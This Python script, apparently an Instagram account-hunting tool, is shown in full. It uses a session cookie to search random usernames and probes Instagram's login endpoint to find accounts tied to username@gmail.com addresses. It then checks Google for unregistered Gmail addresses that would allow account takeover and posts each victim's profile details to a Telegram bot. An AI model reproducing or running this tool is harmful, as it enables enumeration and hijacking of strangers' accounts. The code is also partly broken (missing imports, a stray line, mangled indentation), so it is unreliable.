import requests,random,threading,json,datetime

now = datetime.datetime.today()

now = datetime.datetime.today()

mm = str(now.month)

dd = str(now.day)

yyyy = str(now.year)

hour = str(now.hour)

mi = str(now.minute)

ss = str(now.second)

t=(mm + "/" + dd + "/" + yyyy + " " + hour+ ":" + mi + ":" + ss)

Z = '\033[1;31m' #احمر

hours = (now.hour)

x = datetime.datetime.now()

g= datetime.datetime(2023, 4, 8 , 13, 00 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):

 print('\n\n')

 print('\n\n')

 print(x)

 

 sys.exit(0)

 

if (x.strftime("%x"))==(g.strftime("%x")):

   print('')

   if(x.strftime("%X"))>(g.strftime("%X")):

    print('\n')

    print('\n')

    print(x)

    i

    sys.exit(0)

   else:

    print('')  

else:

    print('')

print('')

os.system('clear')

Z = '\033[1;31m' #احمر

X = '\033[1;33m' #اصفر

F = '\033[2;32m' #اخضر

C = "\033[1;97m" #ابيض

B = '\033[2;36m'#سمائي

Y = '\033[1;34m' #ازرق فاتح.

C = "\033[1;97m" #ابيض

E = '\033[1;31m'

B = '\033[2;36m'

G = '\033[1;32m'

S = '\033[1;33m'

print(f'''  👨‍💻 {G}Tle {B}: {F}@PY_09''')

print('')

print(f'''{Z} [       {G} اســـتــمتع بوقـتـك {Z} ]''')

print('')

token=input(F+'ENTER TOKEN : '+Z)

ID=input(F+'ENTER ID : '+Z)

se=input(F+'SESSION ID : '+Z)

print(' ')

print(f'''{Z} [       {G} بـــداء الــــصــــيد  {Z} ]''')

print(' ')

def KoKo():

	while True:		useh=str("".join(random.choice('qwertyuiopasdfghjklzxcvbnm1234567890_.')for i in range(5)))

		u=f'https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&query={useh}&rank_token=0.009006629352756423&include_reel=true&search_surface=web_top_search'

		h={'cookie':f'sessionid={se}',

'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'}

		rr=requests.get(u,headers=h).json()

		e=0

		while True:

			e +=1

			try:

				user=str(rr['users'][e]['user']['username'])

				email=user+"@gmail.com"

				url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/" 

				headers = {

				'accept': '*/*',

				'accept-encoding': 'gzip, deflate, br',

				'accept-language': 'en-US,en;q=0.9',

				'content-length': '339',

				'content-type': 'application/x-www-form-urlencoded',

				'cookie': 'ig_did=FF240D23-1BD6-400A-8E20-E45C9F3CC177; ig_nrcb=1; mid=Y3-ZmQALAAF-ckg9b83Qo8gChwW1; datr=oZl_Y61WuT7k1_ffDcU9dfSA; csrftoken=7FNKhuixOFA9fht1w1UFQ90f8VjnG00l; dpr=1.25',

				'origin': 'https://www.instagram.com',

				'referer': 'https://www.instagram.com/?__coig_restricted=1',

				'sec-ch-prefers-color-scheme': 'light',

				'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',

				'sec-ch-ua-mobile': '?0',

				'sec-ch-ua-platform': '"Windows"',

				'sec-fetch-dest': 'empty',

				'sec-fetch-mode': 'cors',

				'sec-fetch-site': 'same-origin',

				'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',

				'viewport-width': '972',

				'x-asbd-id': '198387',

				'x-csrftoken': '7FNKhuixOFA9fht1w1UFQ90f8VjnG00l',

				'x-ig-app-id': '936619743392459',

				'x-ig-www-claim': '0',

				'x-instagram-ajax': '1007181939',

				'x-kl-ajax-request': 'Ajax_Request',

				'x-requested-with': 'XMLHttpRequest',

} 

				data = {

				'enc_password':

						'#PWD_INSTAGRAM_BROWSER:0:1679732071:m7640183shds',

				'username': f'{email}',

				'queryParams': '{"__coig_restricted":"1"}',

				'optIntoOneTap': 'false',

				'trustedDeviceRecords': '{}',

}

				rr=requests.post(url,headers=headers,data=data).text

				if '"user":true,"authenticated":false,"status":"ok"' in rr:

					print(f' {G}Good : {email} ')

					email=email.split('@')[0]+'@gmail.com'

					url = 'https://android.clients.google.com/setup/checkavail'

					h = {

		'Content-Length':'98',

		'Content-Type':'text/plain; charset=UTF-8',

		'Host':'android.clients.google.com',

		'Connection':'Keep-Alive',

		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',

		}

					d = json.dumps({

		'username':email,

		'version':'3',

		'firstName':'AbaLahb',

		'lastName':'AbuJahl'

	})

					res = requests.post(url,data=d,headers=h)

					if res.json()['status'] == 'SUCCESS':

						print(B+f'[√] GOOD Gmail : {email}')

						he = {

'accept': '*/*',

'accept-encoding': 'gzip, deflate, br',

'accept-language': 'ar',

'cookie': 'csrftoken=qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI;mid=Yw2UXgAEAAE4Z0qqjhY5LAruCxGL;ig_did=581A8852-CB4E-4DCE-8112-8DBD48CFA6DF;ig_nrcb=1',

'origin': 'https://www.instagram.com',

'referer': 'https://www.instagram.com/',

'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',

'sec-ch-ua-mobile': '?0',

'sec-ch-ua-platform': '"Windows"',

'sec-fetch-dest': 'empty',

'sec-fetch-mode': 'cors',

'sec-fetch-site': 'same-site',

'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',

'x-asbd-id': '198387',

'x-csrftoken': 'qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI',

'x-ig-app-id': '936619743392459',

'x-ig-www-claim': '0',

}

						urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'

						re =requests.get(urlg,headers=he).json()

						bio = re["data"]["user"]["biography"]

						followers = re["data"]["user"]["edge_followed_by"]["count"]

						following=re["data"]["user"]["edge_follow"]["count"]

						name =re["data"]["user"]["full_name"]

						id = re["data"]["user"]["id"]

						posts=re["data"]["user"]["edge_owner_to_timeline_media"]["count"]

						date = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}").json()["date"]

						tlg = f"""

⌯ افرح يول محمد جابلك متاح انستا  ✅ ⌯ 

. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .

[💔] NAME ➥ {name}

[👻] Username ➥ {user}

[👥] Followers ➥ {followers}

[🗣] Following ➥ {following}

[🆔] ID ➥ {id}

[👻] BIO ➥ {bio}

[💞] POSTS ➥ {posts}

[⏱] Data ➥ {date}

. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .

⚖️ Tele : @PY_09

"""

						print(tlg)

						requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+str(tlg))

						

					else:

						  print(X+f'[X] BAAD Gmail : {email}')

						  

				else:

					print(f'{S} Fales {B}: {Z} {email}')

				

		

			except:

				KoKo()

prox_list=[]

for i in range(4):

	t = threading.Thread(target=KoKo)

	t.start()

	prox_list.append(t)  				

KoKo()

						
